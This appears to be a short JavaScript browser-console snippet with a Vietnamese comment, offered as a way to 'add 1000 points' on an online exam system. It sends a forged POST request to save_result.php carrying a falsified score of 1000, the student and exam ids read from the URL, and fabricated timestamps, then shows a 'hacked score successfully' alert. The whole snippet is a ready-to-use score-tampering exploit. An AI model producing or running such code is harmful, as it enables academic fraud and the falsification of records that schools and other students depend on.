// đây là 1 lệnh console giúp thêm 1000 điểm 


fetch(`${window.location.origin}/save_result.php`, {
    method: "POST",
    headers: { "Content-Type": "application/x-www-form-urlencoded" },
    body: `student_id=${new URLSearchParams(window.location.search).get("student_id")}&exam_id=${new URLSearchParams(window.location.search).get("exam_id")}&score=1000&start_time=${new Date().toISOString()}&end_time=${new Date().toISOString()}&duration=300`
}).then(() => alert("Đã hack điểm 1000 thành công!"));
